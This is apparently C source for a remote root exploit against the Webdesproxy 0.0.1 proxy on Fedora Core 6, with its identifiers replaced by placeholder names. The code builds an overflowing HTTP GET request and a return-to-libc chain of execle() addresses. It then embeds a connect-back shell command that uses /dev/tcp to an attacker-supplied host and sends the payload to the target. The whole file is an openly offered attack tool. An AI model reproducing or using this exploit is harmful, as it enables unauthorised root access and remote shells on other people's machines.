
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int ex_buf ;


 int VAR_0 ;
 long VAR_1 ;
 long VAR_2 ;
 long VAR_3 ;
 long VAR_4 ;
 long VAR_5 ;
 long VAR_6 ;
 long VAR_7 ;
 long VAR_8 ;
 long VAR_9 ;
 long VAR_10 ;
 long VAR_11 ;
 long VAR_12 ;
 long VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 long VAR_16 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int *,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int ) ;
 struct hostent* FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int,unsigned char*,int,int ) ;
 int FUNC_10 (int ,int ,int ) ;
 int FUNC_11 (unsigned char*,char*,...) ;
 int FUNC_12 (unsigned char*) ;

int FUNC_13(int VAR_17,char *VAR_18[]){
 int VAR_19=0,VAR_20=0,VAR_21;
 unsigned char VAR_22[4096];

 struct hostent *VAR_23;
 struct sockaddr_in VAR_24;

 FUNC_7((char *)VAR_22,0,sizeof(VAR_22));
 FUNC_8("\n Fedora Core 6 (exec-shield) based\n"
  " Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n"
  " by Xpl017Elz\n\n");

 if(VAR_17<6){
  FUNC_8(" Usage: %s [host] [port] [conn-back host] [input port] [output port]\n",VAR_18[0]);
  FUNC_8(" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n",VAR_18[0]);
  return -1;
 }

 FUNC_11(VAR_22,"GET http://");
 VAR_20=FUNC_12(VAR_22);
 for(VAR_19=0;VAR_19<220;VAR_19++){
  VAR_22[VAR_20++]=0x78;
 }
 VAR_19=0;

 FUNC_8(" [+] make execle() address.\n");
 {

  *(long *)&VAR_22[VAR_20]=VAR_16;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_11;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_9+VAR_19++;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_6;
  VAR_20+=4;

  *(long *)&VAR_22[VAR_20]=VAR_16;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_11;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_9+VAR_19++;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_7;
  VAR_20+=4;

  *(long *)&VAR_22[VAR_20]=VAR_16;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_11;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_9+VAR_19++;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_8;
  VAR_20+=4;
 }

 *(long *)&VAR_22[VAR_20]=VAR_16;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_11;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_1;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_12;
 VAR_20+=4;


 *(long *)&VAR_22[VAR_20]=VAR_16;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_11;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_4;
 VAR_20+=4;
 *(long *)&VAR_22[VAR_20]=VAR_12;
 VAR_20+=4;

 FUNC_8(" [+] execle() argument align padddding...\n");
 for(VAR_19=0;VAR_19<VAR_14;VAR_19++){
  *(long *)&VAR_22[VAR_20]=VAR_13;
  VAR_20+=4;
 }

 FUNC_8(" [+] make execute command.\n");
 {





  *(long *)&VAR_22[VAR_20]=VAR_10;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=0x82828282;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_2;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_2;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_5;
  VAR_20+=4;
  *(long *)&VAR_22[VAR_20]=VAR_3;
  VAR_20+=4;
 }

 FUNC_8(" [+] make connect-back shell command.\n");
 {

  FUNC_11(VAR_22+VAR_20,"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\n",VAR_18[3],FUNC_0(VAR_18[4]),VAR_18[3],FUNC_0(VAR_18[5]));
  VAR_20=FUNC_12(VAR_22);
 }

 FUNC_8(" [+] connect host: %s:%d.\n",VAR_18[1],FUNC_0(VAR_18[2]));
 VAR_23=FUNC_5(VAR_18[1]);
 if(VAR_23==((void*)0)){
  FUNC_8(" [-] gethostbyname() error.\n\n");
  return -1;
 }
 VAR_21=FUNC_10(VAR_0,VAR_15,0);
 if(VAR_21==-1){
  FUNC_8(" [-] socket() error.\n\n");
  return -1;
 }
 VAR_24.sin_family=VAR_0;
 VAR_24.sin_port=FUNC_6(FUNC_0(VAR_18[2]));
 VAR_24.sin_addr=*((struct in_addr *)VAR_23->h_addr);
 FUNC_1(&(VAR_24.sin_zero),8);

 VAR_19=FUNC_3(VAR_21,(struct sockaddr *)&VAR_24,sizeof(struct sockaddr));
 if(VAR_19==-1){
  FUNC_8(" [-] connect() error.\n\n");
  return -1;
 }

 FUNC_8(" [+] exploit size: %d.\n",VAR_20);
 FUNC_8(" [+] send exploit.\n");
 FUNC_9(VAR_21,VAR_22,VAR_20,0);
 FUNC_2(VAR_21);

 FUNC_8(" [*] checking, your connect-back host. :-}\n\n");
 FUNC_4(0);
}
